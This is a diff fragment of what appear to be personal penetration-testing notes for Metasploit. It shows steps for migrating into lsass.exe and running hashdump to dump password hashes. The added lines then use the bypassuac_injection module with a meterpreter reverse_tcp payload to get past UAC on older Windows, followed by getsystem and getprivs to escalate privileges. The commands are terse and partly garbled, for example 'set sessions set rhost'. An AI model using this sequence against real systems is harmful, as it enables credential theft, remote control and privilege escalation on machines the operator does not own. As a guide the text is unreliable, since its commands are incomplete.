@@ -94,5 +94,12 @@ ps -S lsass.exe
 migrate pid
 hashdump boom
 
-
+it will be vuln on win 2008,win vista
+we can use  exploit(windows/local/bypassuac_injection) to bypass the uac
+set sessions set rhost 
+set payload windows/x64/meterpreter/reverse_tcp
+set Target windows \ x64
+done
+we can do getsystem 
+getprivs we get all privileges
 
